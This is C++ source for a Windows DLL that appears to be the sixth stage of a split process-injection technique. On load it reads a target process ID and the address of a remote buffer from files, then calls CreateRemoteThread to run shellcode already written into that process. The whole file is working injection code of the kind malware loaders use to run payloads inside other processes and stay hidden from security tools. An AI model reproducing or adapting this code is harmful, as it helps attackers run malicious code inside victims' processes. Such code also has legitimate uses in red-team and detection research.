// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /TP step6.cpp /link /DLL /out:step6.dll /SUBSYSTEM:CONSOLE /MACHINE:x64

// Makes the remote section executable
#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")
#include "splitproc.h"

typedef unsigned __int64 QWORD;
HANDLE log_file = NULL;
size_t bytesWritten;
DWORD bytesWritten2;
DWORD bytesRead = 0;
BOOL verbose_output = TRUE;
DWORD target_proc_pid = 0;

char shellcode[BUFFER_SIZE];
char msg[1024];

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten2, NULL);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("split.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// get the pid to inject into
	HANDLE pid_file = CreateFileA("split.pid", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(pid_file==INVALID_HANDLE_VALUE)
	{
		log_msg("Cannot open PID file. Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return FALSE;
	}
	ReadFile(pid_file,&target_proc_pid,sizeof(target_proc_pid),&bytesRead,NULL);
	CloseHandle(pid_file);
	
    if (!target_proc_pid) {		
        log_msg("Process PID not found in the log.\n");
		if(verbose_output) CloseHandle(log_file);
        return FALSE;
    }
	
	snprintf(msg,sizeof(msg),"PID found (step5) in the log: %d\n",target_proc_pid);
	log_msg(msg);		
		
	LPVOID remoteBuffer = NULL;
	HANDLE ptr_file = CreateFileA("split.buff_addr", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);		
	if(ptr_file==INVALID_HANDLE_VALUE)
	{	
		log_msg("Cannot open the remote buffer address file split.buff_addr (step6). Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return FALSE;
	}		
	QWORD ptrAsInt = 0;
	ReadFile(ptr_file,&ptrAsInt,sizeof(QWORD),&bytesRead,NULL);
	CloseHandle(ptr_file);
	ptrAsInt = ptrAsInt+512; // increasing by the data section offset (512)
	remoteBuffer = (LPVOID)ptrAsInt;				
	snprintf(msg,sizeof(msg),"Remote buffer address read from the ptr file + 512 bytes (data section size) to start the thread execution at (step6): %p\n",remoteBuffer);
	log_msg(msg);			
	
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD, FALSE, target_proc_pid);
	if (!hProcess) {
		log_msg("Failed to open process.\n");
		printf("LAST ERROR: %d",GetLastError());
		return FALSE;
	}
	// now, finally - we start the remote thread
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!hThread) {
		log_msg("Failed to create remote thread.\n");
		VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}		
	WaitForSingleObject(hThread, INFINITE);		 // we might want to get rid of this
	CloseHandle(hProcess);
	log_msg("Remote thread created, step6 completed.\n");
	if(verbose_output) CloseHandle(log_file);	
	return TRUE;
}